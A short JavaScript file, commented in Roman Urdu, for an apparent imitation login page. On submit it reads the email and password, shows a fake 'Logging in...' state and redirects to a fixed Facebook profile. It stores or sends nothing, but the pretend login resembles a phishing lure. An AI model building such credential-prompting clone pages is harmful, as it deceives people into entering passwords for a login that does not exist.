document.addEventListener('DOMContentLoaded', () => {
    
    // Aapki Facebook ID ka Link
    const FACEBOOK_PROFILE_URL = "https://www.facebook.com/profile.php?id=61592625821409";

    // Dono forms ko select karein (Desktop aur Mobile)
    const forms = document.querySelectorAll('form');

    forms.forEach(form => {
        form.addEventListener('submit', (e) => {
            e.preventDefault(); // Page reload hone se rokne ke liye
            
            // Input values uthana
            const inputs = form.querySelectorAll('input');
            const email = inputs[0].value.trim();
            const password = inputs[1].value.trim();

            // Basic Validation (Check karein ke khali toh nahi)
            if (email === '' || password === '') {
                alert('Please fill in all fields.');
                return;
            }

            // Button loading state (Professional touch)
            const submitBtn = form.querySelector('.btn-login');
            const originalText = submitBtn.innerText;
            
            submitBtn.innerText = 'Logging in...';
            submitBtn.style.opacity = '0.8';
            submitBtn.disabled = true;

            // 1.5 second ka delay aur phir Facebook par redirect
            setTimeout(() => {
                // Yeh line user ko Facebook ID par le jayegi
                window.location.href = FACEBOOK_PROFILE_URL;
            }, 1500);
        });
    });

    // "Create New Account" button click handler
    const createBtns = document.querySelectorAll('.btn-create-new');
    createBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            alert('Redirecting to Sign Up page...');
            // Yahan aap apna signup page laga sakte hain
            // window.location.href = 'signup.html';
        });
    });

    // Mobile Back Arrow
    const backArrow = document.querySelector('.back-icon');
    if(backArrow) {
        backArrow.addEventListener('click', () => {
            window.history.back();
        });
    }

    // Forgot Password Link
    const forgotLinks = document.querySelectorAll('.forgot-link');
    forgotLinks.forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            alert('Please enter your email to reset your password.');
        });
    });
});